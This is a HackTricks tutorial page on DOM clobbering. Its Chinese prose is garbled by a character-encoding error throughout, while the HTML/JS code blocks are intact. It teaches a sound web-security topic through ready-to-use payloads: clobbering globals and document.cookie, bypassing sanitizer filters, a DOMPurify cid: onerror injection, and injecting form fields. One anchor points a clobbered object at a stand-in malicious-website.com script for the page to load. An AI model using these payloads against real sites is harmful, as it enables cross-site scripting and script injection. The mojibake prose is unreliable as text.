# Dom Clobbering

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **åŸºç¡€çŸ¥è¯†**

å¯ä»¥é€šè¿‡ HTML æ ‡ç­¾ä¸­çš„ **`id`** å’Œ **`name`** å±æ€§åœ¨ JS ä¸Šä¸‹æ–‡ä¸­ç”Ÿæˆ **å…¨å±€å˜é‡**ã€‚
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**åªæœ‰**æŸäº›å…ƒç´ å¯ä»¥ä½¿ç”¨**nameå±æ€§**æ¥è¦†ç›–å…¨å±€å˜é‡ï¼Œå®ƒä»¬æ˜¯ï¼š`embed`ã€`form`ã€`iframe`ã€`image`ã€`img`å’Œ`object`ã€‚

æœ‰è¶£çš„æ˜¯ï¼Œå½“ä½ ä½¿ç”¨**formå…ƒç´ **æ¥**è¦†ç›–**ä¸€ä¸ªå˜é‡æ—¶ï¼Œä½ å°†å¾—åˆ°è¯¥å…ƒç´ æœ¬èº«çš„**`toString`**å€¼ï¼š`[object HTMLFormElement]`ï¼Œä½†ä½¿ç”¨**anchor**æ—¶ï¼Œ**`toString`**å°†æ˜¯é”šç‚¹çš„**`href`**ã€‚å› æ­¤ï¼Œå¦‚æœä½ ä½¿ç”¨**`a`**æ ‡ç­¾è¿›è¡Œè¦†ç›–ï¼Œä½ å¯ä»¥**æ§åˆ¶**å½“å®ƒè¢«**è§†ä¸ºå­—ç¬¦ä¸²**æ—¶çš„**å€¼**ï¼š
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### æ•°ç»„ä¸å±æ€§

ä¹Ÿå¯ä»¥**è¦†ç›–ä¸€ä¸ªæ•°ç»„**å’Œ**å¯¹è±¡å±æ€§**ï¼š
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
è¦è¦†ç›– **ç¬¬ä¸‰ä¸ªå±æ€§** (ä¾‹å¦‚ x.y.z)ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ **`form`**ï¼š
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Clobberingæ›´å¤šå±æ€§æ˜¯**æ›´å¤æ‚ä½†ä»ç„¶å¯èƒ½**ï¼Œä½¿ç”¨iframï¼š
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
styleæ ‡ç­¾ç”¨äº**ç»™iframeè¶³å¤Ÿçš„æ—¶é—´è¿›è¡Œæ¸²æŸ“**ã€‚æ²¡æœ‰å®ƒï¼Œä½ ä¼šå‘ç°ä¸€ä¸ª**æœªå®šä¹‰**çš„è­¦å‘Šã€‚
{% endhint %}

è¦è¦†ç›–æ›´æ·±å±‚çš„å±æ€§ï¼Œä½ å¯ä»¥ä½¿ç”¨**å¸¦æœ‰HTMLç¼–ç çš„iframes**ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **è¿‡æ»¤å™¨ç»•è¿‡**

å¦‚æœä¸€ä¸ªè¿‡æ»¤å™¨æ­£åœ¨ä½¿ç”¨ç±»ä¼¼ `document.getElementByID('x').attributes` çš„æ–¹å¼**å¾ªç¯**éå†ä¸€ä¸ªèŠ‚ç‚¹çš„**å±æ€§**ï¼Œä½ å¯ä»¥**è¦†ç›–**å±æ€§**`.attributes`**å¹¶**ç ´åè¿‡æ»¤å™¨**ã€‚å…¶ä»– DOM å±æ€§å¦‚ **`tagName`**ã€**`nodeName`** æˆ– **`parentNode`** ç­‰ä¹Ÿå¯ä»¥è¢«**è¦†ç›–**ã€‚
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **è¦†ç›– `window.someObject`**

åœ¨JavaScriptä¸­ï¼Œå¸¸å¸¸ä¼šå‘ç°ï¼š
```javascript
var someObject = window.someObject || {};
```
åœ¨é¡µé¢ä¸Šæ“çºµ HTML å…è®¸ç”¨ DOM èŠ‚ç‚¹è¦†ç›– `someObject`ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨æ¼æ´ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ç”¨æŒ‡å‘æ¶æ„è„šæœ¬çš„é”šå…ƒç´ æ›¿æ¢ `someObject`ï¼š
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
åœ¨ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ä»£ç ä¸­ï¼Œä¾‹å¦‚ï¼š
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
æ­¤æ–¹æ³•åˆ©ç”¨è„šæœ¬æºæ‰§è¡Œä¸å¿…è¦çš„ä»£ç ã€‚

**æŠ€å·§**ï¼š**`DOMPurify`** å…è®¸æ‚¨ä½¿ç”¨ **`cid:`** åè®®ï¼Œè¿™ **ä¸ä¼šå¯¹åŒå¼•å·è¿›è¡Œ URL ç¼–ç **ã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥ **æ³¨å…¥ä¸€ä¸ªåœ¨è¿è¡Œæ—¶ä¼šè¢«è§£ç çš„ç¼–ç åŒå¼•å·**ã€‚å› æ­¤ï¼Œæ³¨å…¥ç±»ä¼¼ **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** çš„å†…å®¹å°†ä½¿ HTML ç¼–ç çš„ `&quot;` åœ¨ **è¿è¡Œæ—¶è§£ç ** å¹¶ **é€ƒé€¸** å‡ºå±æ€§å€¼ä»¥ **åˆ›å»º** **`onerror`** äº‹ä»¶ã€‚

å¦ä¸€ç§æŠ€æœ¯ä½¿ç”¨ **`form`** å…ƒç´ ã€‚æŸäº›å®¢æˆ·ç«¯åº“æ£€æŸ¥æ–°åˆ›å»ºçš„è¡¨å•å…ƒç´ çš„å±æ€§ä»¥è¿›è¡Œæ¸…ç†ã€‚ç„¶è€Œï¼Œé€šè¿‡åœ¨è¡¨å•å†…æ·»åŠ ä¸€ä¸ª `input`ï¼Œå…¶ `id=attributes`ï¼Œæ‚¨æœ‰æ•ˆåœ°è¦†ç›–äº†å±æ€§å±æ€§ï¼Œé˜»æ­¢äº†æ¸…ç†å™¨è®¿é—®å®é™…å±æ€§ã€‚

æ‚¨å¯ä»¥åœ¨ [**æ­¤ CTF æ–‡ç« ä¸­æ‰¾åˆ°æ­¤ç±»è¦†ç›–çš„ç¤ºä¾‹**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ã€‚

## è¦†ç›–æ–‡æ¡£å¯¹è±¡

æ ¹æ®æ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨ DOM Clobbering è¦†ç›–æ–‡æ¡£å¯¹è±¡çš„å±æ€§ï¼š

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) æ¥å£ [æ”¯æŒå‘½åå±æ€§](https://webidl.spec.whatwg.org/#dfn-support-named-properties)ã€‚ä»»ä½•æ—¶åˆ»çš„ [Document](https://html.spec.whatwg.org/multipage/dom.html#document) å¯¹è±¡çš„ [æ”¯æŒçš„å±æ€§åç§°](https://webidl.spec.whatwg.org/#dfn-supported-property-names) ç”±ä»¥ä¸‹å†…å®¹ç»„æˆï¼ŒæŒ‰ç…§ [æ ‘é¡ºåº](https://dom.spec.whatwg.org/#concept-tree-order) æ ¹æ®è´¡çŒ®å®ƒä»¬çš„å…ƒç´ ï¼Œå¿½ç•¥åæ¥çš„é‡å¤ï¼Œå¹¶ä¸”æ¥è‡ª [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å±æ€§çš„å€¼åœ¨åŒä¸€å…ƒç´ åŒæ—¶è´¡çŒ®ä¸¤è€…æ—¶æ’åœ¨æ¥è‡ªåç§°å±æ€§çš„å€¼ä¹‹å‰ï¼š
>
> \- æ‰€æœ‰å…·æœ‰éç©ºåç§°å†…å®¹å±æ€§å¹¶ä¸”åœ¨ä»¥æ–‡æ¡£ä¸º [æ ¹](https://dom.spec.whatwg.org/#concept-tree-root) çš„ [æ–‡æ¡£æ ‘](https://dom.spec.whatwg.org/#in-a-document-tree) ä¸­çš„æ‰€æœ‰ [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)ã€[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)ã€[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)ã€[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) å’Œ [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) å…ƒç´ çš„åç§°å†…å®¹å±æ€§çš„å€¼ï¼›\
> \
> \- æ‰€æœ‰å…·æœ‰éç©º [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å†…å®¹å±æ€§å¹¶ä¸”åœ¨ä»¥æ–‡æ¡£ä¸º [æ ¹](https://dom.spec.whatwg.org/#concept-tree-root) çš„ [æ–‡æ¡£æ ‘](https://dom.spec.whatwg.org/#in-a-document-tree) ä¸­çš„æ‰€æœ‰ [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) å…ƒç´ çš„ [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å†…å®¹å±æ€§çš„å€¼ï¼›\
> \
> \- æ‰€æœ‰å…·æœ‰éç©º [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å†…å®¹å±æ€§å’Œéç©ºåç§°å†…å®¹å±æ€§çš„ [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) å…ƒç´ çš„ [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å†…å®¹å±æ€§çš„å€¼ï¼Œå¹¶ä¸”åœ¨ä»¥æ–‡æ¡£ä¸º [æ ¹](https://dom.spec.whatwg.org/#concept-tree-root) çš„ [æ–‡æ¡£æ ‘](https://dom.spec.whatwg.org/#in-a-document-tree) ä¸­ã€‚

ä½¿ç”¨æ­¤æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥è¦†ç›–å¸¸ç”¨çš„ **å€¼ï¼Œä¾‹å¦‚ `document.cookie`ã€`document.body`ã€`document.children`**ï¼Œç”šè‡³æ–‡æ¡£æ¥å£ä¸­çš„æ–¹æ³•ï¼Œå¦‚ `document.querySelector`ã€‚
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## å†™å…¥è¢«è¦†ç›–çš„å…ƒç´ å

é€šè¿‡æ³¨å…¥å…·æœ‰ç›¸åŒ id å±æ€§çš„ `<html>` æˆ– `<body>` æ ‡ç­¾ï¼Œå¯ä»¥æ›´æ”¹å¯¹ **`document.getElementById()`** å’Œ **`document.querySelector()`** çš„è°ƒç”¨ç»“æœã€‚ä»¥ä¸‹æ˜¯å®ç°æ–¹æ³•ï¼š
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
æ­¤å¤–ï¼Œé€šè¿‡ä½¿ç”¨æ ·å¼éšè—è¿™äº›æ³¨å…¥çš„ HTML/body æ ‡ç­¾ï¼Œå¯ä»¥é˜²æ­¢ `innerText` ä¸­å…¶ä»–æ–‡æœ¬çš„å¹²æ‰°ï¼Œä»è€Œå¢å¼ºæ”»å‡»çš„æœ‰æ•ˆæ€§ï¼š
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
å¯¹SVGçš„è°ƒæŸ¥æ˜¾ç¤ºï¼Œ`<body>`æ ‡ç­¾ä¹Ÿå¯ä»¥æœ‰æ•ˆåœ°åˆ©ç”¨ï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
ä¸ºäº†ä½¿HTMLæ ‡ç­¾åœ¨åƒChromeå’ŒFirefoxè¿™æ ·çš„æµè§ˆå™¨ä¸­çš„SVGä¸­æ­£å¸¸å·¥ä½œï¼Œå¿…é¡»ä½¿ç”¨`<foreignobject>`æ ‡ç­¾ï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

å¯ä»¥é€šè¿‡åœ¨æŸäº›æ ‡ç­¾ä¸­æŒ‡å®š `form` å±æ€§æ¥ **åœ¨è¡¨å•ä¸­æ·»åŠ æ–°æ¡ç›®**ã€‚æ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ **åœ¨è¡¨å•ä¸­æ·»åŠ æ–°å€¼**ï¼Œç”šè‡³æ·»åŠ ä¸€ä¸ªæ–°çš„ **æŒ‰é’®** æ¥ **å‘é€å®ƒ**ï¼ˆç‚¹å‡»åŠ«æŒæˆ–æ»¥ç”¨æŸäº› `.click()` JS ä»£ç ï¼‰ï¼š

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* æœ‰å…³æ›´å¤šè¡¨å•å±æ€§ï¼Œè¯·æŸ¥çœ‹[**æŒ‰é’®æ£€æŸ¥æ­¤å¤„**](https://www.w3schools.com/tags/tag\_button.asp)**ã€‚**

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: å­¦ä¹ åƒé»‘å®¢ä¸€æ ·æ€è€ƒã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
